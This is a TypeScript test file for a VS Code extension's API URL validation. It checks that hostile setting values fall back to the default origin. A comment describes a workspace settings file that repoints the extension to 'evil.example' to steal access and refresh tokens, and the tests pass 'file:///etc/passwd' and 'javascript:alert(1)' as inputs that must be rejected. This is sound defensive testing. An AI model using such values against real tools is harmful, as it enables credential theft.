import { beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * The API origin decides where a Ateva access token is sent.
 *
 * `ateva.apiUrl` was plain `window` scope with no validation, so a
 * repository shipping `.vscode/settings.json` containing
 * `{"ateva.apiUrl": "https://evil.example/api/v1"}` repointed the extension
 * the moment the folder was opened — sending the developer's access AND refresh
 * tokens to the attacker. `scope: machine` in package.json stops workspace
 * values being read at all; these tests cover the second line of defence, since
 * a setting that carries a credential should not be trusted on scope alone.
 */

const mock = vi.hoisted(() => ({ configured: undefined as string | undefined }));

vi.mock('vscode', () => ({
  workspace: {
    getConfiguration: () => ({ get: () => mock.configured }),
  },
  ConfigurationTarget: { Global: 1 },
}));

const DEFAULT = 'https://ateva.vercel.app/api/v1';

async function apiUrl(value: string | undefined): Promise<string> {
  mock.configured = value;
  const { ConfigurationManager } = await import('./config');
  return new ConfigurationManager({
    get: async () => undefined,
    store: async () => undefined,
    delete: async () => undefined,
    onDidChange: () => ({ dispose() {} }),
  } as never).getApiUrl();
}

describe('ConfigService.getApiUrl override validation', () => {
  beforeEach(() => {
    vi.spyOn(console, 'error').mockImplementation(() => undefined);
  });

  it('falls back to production when nothing is configured', async () => {
    await expect(apiUrl(undefined)).resolves.toBe(DEFAULT);
    await expect(apiUrl('')).resolves.toBe(DEFAULT);
  });

  it('accepts any https origin — scope: machine is what stops a workspace choosing it', async () => {
    // Deliberate: `scope: machine` is what stops a workspace choosing this.
    // A user who edits their own machine settings may point anywhere.
    await expect(apiUrl('https://staging.ateva.com/api/v1')).resolves.toBe(
      'https://staging.ateva.com/api/v1',
    );
  });

  it('rejects plain http on a remote host — the token would cross the wire in clear', async () => {
    await expect(apiUrl('http://evil.example/api/v1')).resolves.toBe(DEFAULT);
  });

  it('allows http only on loopback, where there is no network to intercept', async () => {
    await expect(apiUrl('http://localhost:4002/api/v1')).resolves.toBe(
      'http://localhost:4002/api/v1',
    );
    await expect(apiUrl('http://127.0.0.1:4002/api/v1')).resolves.toBe(
      'http://127.0.0.1:4002/api/v1',
    );
  });

  it('rejects non-http schemes outright', async () => {
    for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'ftp://x/y']) {
      await expect(apiUrl(bad)).resolves.toBe(DEFAULT);
    }
  });

  it('rejects a malformed value instead of passing it to fetch', async () => {
    await expect(apiUrl('not a url')).resolves.toBe(DEFAULT);
  });
});
